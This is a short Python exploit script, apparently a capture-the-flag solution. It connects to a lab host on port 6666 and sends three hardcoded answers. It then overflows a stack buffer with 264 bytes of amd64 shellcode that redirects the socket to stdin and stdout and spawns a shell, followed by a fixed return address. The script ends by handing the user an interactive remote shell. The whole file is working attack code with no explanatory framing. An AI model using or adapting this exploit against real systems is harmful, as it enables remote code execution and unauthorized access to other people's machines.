#!/usr/bin/env python
from sc_pwn import *

rhp     = ("192.168.75.129",6666)

addr_buf = 0x7fffffffd910

#==========
def attack(nc):
    nc.read_all()
    nc.sendln('arsenal')
    nc.read_all()
    nc.sendln('gyeongbokgung')
    nc.read_all()
    nc.sendln('psy')

    sc = ShellCode('amd64',264)
    sc.dup2(4,0)
    sc.dup2(4,1)
    sc.sh()
    sc.padding()

    exploit  = sc.get()
    exploit += pack_64(addr_buf)

    nc.read_all()
    nc.send(exploit)

#==========

if __name__=='__main__':
    nc = Communicate(rhp)
    attack(nc)

    sh = Shell(nc)
    sh.select()

    del(sh)
    del(nc)
    
#==========
